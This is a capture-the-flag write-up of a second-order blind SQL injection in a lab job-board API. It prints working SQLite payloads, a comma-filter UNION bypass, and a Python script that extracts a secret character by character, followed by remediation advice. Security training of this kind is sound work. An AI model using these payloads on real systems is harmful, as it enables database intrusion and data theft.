---
layout: default
title: "FurHire (SQLi Second-order) - Bugforge"
---

[← Back](./)

# Bugforge - FurHire Lab Writeup

<div class="meta">
  <span><strong>Date:</strong> 2026-01-28</span>
  <span><strong>Difficulty:</strong> Medium</span>
  <span><strong>Platform:</strong> Bugforge</span>
</div>

---

## Executive Summary

**Overall Risk Rating:** 🔴 Critical

**Key Findings:**
- 1 Critical second-order blind SQL injection in job posting functionality
- Input filter blocking commas, requiring alternative injection techniques
- Sensitive data (flag) stored in accessible config table
- SQLite database with no parameterized queries

**Business Impact:** Second-order blind SQL injection allows attackers to extract all database contents including configuration secrets, user credentials, and application data through boolean-based conditional responses.

---

## Objective

Extract the flag from the application's database.

## Initial Access

```bash
# Target Application
URL: https://lab-1769564342867-r3ugba.labs-app.bugforge.io

# Auth: JWT Bearer token (recruiter role)
Authorization: Bearer <JWT>
```

## Key Findings

### Critical & High-Risk Vulnerabilities

1. **Second-Order Blind SQLi** - Job title field injectable, result verified via separate endpoint (CWE-89)
2. **Comma Filter Bypass** - Application blocks commas but JOIN-based UNION bypass possible (CWE-943)
3. **Sensitive Data Exposure** - Flag stored in plaintext in config table (CWE-312)

**CVSS v3.1 Score for SQLi Chain:** **8.6 (High)**

| Metric | Value |
|--------|-------|
| Attack Vector | Network (AV:N) |
| Attack Complexity | Low (AC:L) |
| Privileges Required | Low (PR:L) |
| User Interaction | None (UI:N) |
| Scope | Changed (S:C) |
| Confidentiality | High (C:H) |
| Integrity | None (I:N) |
| Availability | None (A:N) |

## Enumeration Summary

### Application Analysis

**Target Endpoints Discovered:**
- `POST /api/jobs` - Create job posting (injection point)
- `GET /api/jobs/{id}/applicants` - View applicants (boolean oracle)
- `GET /api/jobs` - List all jobs

**Summary:**
- **Database:** SQLite
- **Authentication:** JWT Bearer token (role-based: recruiter, user)
- **Input Filtering:** Commas blocked in input fields
- **Injection Type:** Second-order blind (submit → check separate endpoint)

## Attack Chain Visualization

```
┌─────────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
│   Identify SQLi     │────▶│   Comma Filter   │────▶│   Boolean Blind     │
│   in job title      │     │   Detected       │     │   via EXISTS/LIKE   │
│   POST /api/jobs    │     │   Use JOIN bypass│     │   + GLOB            │
└─────────────────────┘     └──────────────────┘     └─────────────────────┘
                                                                │
                                                                ▼
┌─────────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
│   Flag Extracted    │◀────│   Extract value  │◀────│   Enumerate tables  │
│   bug{...}          │     │   char-by-char   │     │   users, config     │
│                     │     │   Python script  │     │   columns: key,value│
└─────────────────────┘     └──────────────────┘     └─────────────────────┘
```

**Attack Path Summary:**
1. **Identify Injection:** SQLi in job title field via `POST /api/jobs`
2. **Discover Boolean:** Check `GET /api/jobs/{id}/applicants` - array with items = true, empty `[]` = false
3. **Enumerate Tables:** `EXISTS` queries against `sqlite_master`
4. **Enumerate Columns:** `LIKE` against `sql` column in `sqlite_master`
5. **Extract Flag:** Character-by-character using `GLOB` (case-sensitive)
6. **Alternative:** Direct extraction via 15-column UNION SELECT with JOIN bypass

---

## Exploitation Path

### Step 1: Identify Injection Point

SQLi in the `title` field when creating a job posting:

```http
POST /api/jobs HTTP/2
Host: lab-1769564342867-r3ugba.labs-app.bugforge.io
Authorization: Bearer <JWT>
Content-Type: application/json

{"title":"SQLi HERE","description":"descrip","location":"local","job_type":"Full-time","salary_range":"1","requirements":["Guarding"]}
```

**Second-order behavior:** Injection submitted via POST, result checked via GET on a different endpoint using the returned job ID:

```http
POST /api/jobs → {"id":49,"message":"Job posted successfully"}
GET /api/jobs/49/applicants → [...] or []
```

- **True condition:** Returns array of applicants (Content-Length > 2)
- **False condition:** Returns empty array `[]` (Content-Length = 2)

### Step 2: Confirm SQLite & Boolean

```sql
-- True test
'or 1=1--

-- False test
'or 1=2--
```

Confirmed different responses between true/false conditions.

### Step 3: Enumerate Tables

**Key learning:** `LIKE` with a subquery returning multiple rows only checks the **first row**. Use `EXISTS` for confirming exact table names across all rows.

```sql
-- EXISTS checks ALL rows (reliable)
'or exists(select 1 from sqlite_master where type='table' and name='users')--
'or exists(select 1 from sqlite_master where type='table' and name='config')--

-- LIKE only checks FIRST row returned (unreliable for multi-row results)
'or (SELECT name FROM sqlite_master WHERE type='table') LIKE 'u%'--
```

**Tables found:** `users`, `config`

### Step 4: Enumerate Columns

Used the `sql` column from `sqlite_master` which contains the full CREATE TABLE statement:

```sql
'or exists(select 1 from sqlite_master where name='config' and sql LIKE '%key%')--
'or exists(select 1 from sqlite_master where name='config' and sql LIKE '%value%')--
```

**Config table columns:** `key`, `value`

### Step 5: Locate Flag & Determine Length

```sql
-- Confirm flag exists
'or exists(select 1 from config where key LIKE '%flag%')--

-- Determine length (binary search)
'or (select length(value) from config where key LIKE '%flag%')>10--
'or (select length(value) from config where key LIKE '%flag%')>20--
'or (select length(value) from config where key LIKE '%flag%')>30--
'or (select length(value) from config where key LIKE '%flag%')=37--
```

**Flag length:** 37 characters (5 for `bug{}` + 32 to extract)

### Step 6: Extract Flag - Python Script

Used `GLOB` instead of `LIKE` for **case-sensitive** matching:

```python
import requests

base_url = "https://lab-1769564342867-r3ugba.labs-app.bugforge.io"
url_inject = f"{base_url}/api/jobs"
token = "JWT_TOKEN"
flag = "bug{"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

session = requests.Session()
session.headers.update({
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
})

while len(flag) < 36:
    found = False
    for c in chars:
        sqli = f"'or (select value from config where key GLOB '*flag*') GLOB '{flag}{c}*'--"
        data = {
            "title": sqli,
            "description": "descrip",
            "location": "local",
            "job_type": "Full-time",
            "salary_range": "1",
            "requirements": ["Guarding"]
        }
        r1 = session.post(url_inject, json=data)
        job_id = r1.json().get("id")
        r2 = session.get(f"{base_url}/api/jobs/{job_id}/applicants")
        if len(r2.content) > 2:
            flag += c
            print(f"[+] {flag}")
            found = True
            break
    if not found:
        break

flag += "}"
print(f"Flag: {flag}")
```

### Alternative: UNION SELECT (Direct Extraction)

15-column UNION SELECT using JOIN to bypass comma filter - extracts flag in a single request:

```sql
' UNION SELECT * FROM (SELECT value FROM config WHERE key='flag') JOIN (SELECT 2) JOIN (SELECT 3) JOIN (SELECT 4) JOIN (SELECT 5) JOIN (SELECT 6) JOIN (SELECT 7) JOIN (SELECT 8) JOIN (SELECT 9) JOIN (SELECT 10) JOIN (SELECT 11) JOIN (SELECT 12) JOIN (SELECT 13) JOIN (SELECT 14) JOIN (SELECT 15)--
```

This places the flag value directly into the job listing response - no scripting needed.

---

## Flag / Objective Achieved

✅ **Objective:** Extracted flag from config table via second-order blind SQLi

✅ **Flag:** Retrieved via boolean blind extraction and confirmed via UNION SELECT

---

## Key Learnings

### SQLite Blind Injection Techniques

| Technique | Use Case | Syntax |
|-----------|----------|--------|
| `EXISTS` | Confirm exact names across all rows | `exists(select 1 from table where name='x')` |
| `LIKE` | Pattern match on a single row | `(select col from table) LIKE 'a%'` |
| `GLOB` | Case-sensitive extraction | `(select col from table) GLOB 'A*'` |

### LIKE vs GLOB in SQLite

| | LIKE | GLOB |
|---|---|---|
| Case | Insensitive | **Sensitive** |
| Wildcard any | `%` | `*` |
| Wildcard single | `_` | `?` |

### LIKE Gotcha
`LIKE` with a subquery returning multiple rows only checks the **first row**. Use `EXISTS` to check across all rows.

### Comma Filter Bypass
Use `JOIN` syntax for UNION SELECT:

```sql
-- Instead of: UNION SELECT 1,2,3
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
```

### Second-Order SQLi
Injection and result verification happen at different endpoints. Automated scripts must:
1. POST payload → capture returned ID from response
2. GET check endpoint with that ID → evaluate boolean condition based on content length

---

## Tools Used

- **Burp Suite** - Request interception and manual testing
- **Python requests** - Automated flag extraction script

---

## Remediation

### 1. SQL Injection in Job Title Field (CVSS: 8.6 - High)

**Issue:** User-supplied job title is concatenated directly into SQL queries without parameterization.

**CWE Reference:** CWE-89 - Improper Neutralization of Special Elements used in an SQL Command

**Fix:**

```python
# BEFORE (Vulnerable)
@app.route('/api/jobs', methods=['POST'])
def create_job():
    title = request.json['title']
    db.execute(f"INSERT INTO jobs (title, ...) VALUES ('{title}', ...)")

# AFTER (Secure)
@app.route('/api/jobs', methods=['POST'])
def create_job():
    title = request.json['title']
    db.execute("INSERT INTO jobs (title, ...) VALUES (?, ...)", (title,))
```

### 2. Sensitive Data in Config Table (CVSS: 6.5 - Medium)

**Issue:** Sensitive application secrets stored in plaintext in a database table accessible via SQL injection.

**CWE Reference:** CWE-312 - Cleartext Storage of Sensitive Information

**Fix:**

```python
# Store secrets in environment variables, not database
import os
FLAG = os.environ.get('APP_FLAG')

# Or encrypt sensitive config values
from cryptography.fernet import Fernet
cipher = Fernet(os.environ['ENCRYPTION_KEY'])
encrypted_value = cipher.encrypt(value.encode())
```

---

## Failed Attempts

### Approach 1: ORDER BY Enumeration

```sql
' ORDER BY 1--
' ORDER BY 2--
```

**Result:** ❌ Failed - ORDER BY did not produce observable differences in second-order context

### Approach 2: LIKE for Multi-Row Table Enumeration

```sql
'or (SELECT name FROM sqlite_master WHERE type='table') LIKE '%config%'--
```

**Result:** ❌ Returned false even though config table exists - LIKE only checks first row returned, and `users` was first alphabetically

**Fix:** Use `EXISTS` instead:

```sql
'or exists(select 1 from sqlite_master where type='table' and name='config')--
```

### Approach 3: LIKE for Case-Sensitive Flag Extraction

```sql
'or (select value from config where key LIKE '%flag%') LIKE 'bug{A%'--
```

**Result:** ❌ Unreliable - LIKE is case-insensitive in SQLite, can't distinguish uppercase from lowercase

**Fix:** Use `GLOB` for case-sensitive matching:

```sql
'or (select value from config where key GLOB '*flag*') GLOB 'bug{A*'--
```

---

## OWASP Top 10 Coverage

- **A03:2021** - Injection (Second-order blind SQL injection in job title)
- **A04:2021** - Insecure Design (Boolean oracle via applicants endpoint, no input sanitization)
- **A05:2021** - Security Misconfiguration (Sensitive data in database config table)

---

## References

**SQLi Resources:**
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks - SQLite Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlite-injection.html)
- [SQLite Documentation - Expressions](https://www.sqlite.org/lang_expr.html)
- [PortSwigger - Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)

---

**Tags:** `#sqli` `#blind-sqli` `#second-order` `#sqlite` `#comma-bypass` `#bugforge`
